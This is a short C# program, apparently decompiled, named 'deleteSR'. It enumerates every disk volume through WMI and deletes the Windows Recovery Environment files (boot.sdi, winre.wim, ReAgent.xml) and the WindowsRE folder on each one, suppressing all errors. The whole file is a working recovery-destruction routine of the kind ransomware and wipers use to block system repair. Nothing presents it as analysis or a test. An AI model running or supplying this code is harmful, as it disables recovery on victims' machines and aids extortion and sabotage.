using System;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;

namespace deleteSR
{
	internal class Class1
	{
        private static void Main(string[] args)
		{
            foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("SELECT DeviceID, DriveLetter FROM Win32_Volume").Get())
			{
				ManagementObject managementObject = (ManagementObject)managementBaseObject;
				object obj = managementObject["DeviceID"];
				string text = (obj != null) ? obj.ToString() : null;
				object obj2 = managementObject["DriveLetter"];
				if (obj2 != null)
				{
					obj2.ToString();
				}
				if (!string.IsNullOrEmpty(text))
				{
					string text2 = Path.Combine(text, "Recovery\\WindowsRE");
					string path = Path.Combine(text2, "boot.sdi");
					string path2 = Path.Combine(text2, "winre.wim");
					string path3 = Path.Combine(text2, "ReAgent.xml");
					try
					{
						File.Delete(path);
						File.Delete(path2);
						File.Delete(path3);
						Directory.Delete(text2, true);
					}
					catch
					{
					}
				}
			}
		}
	}
}
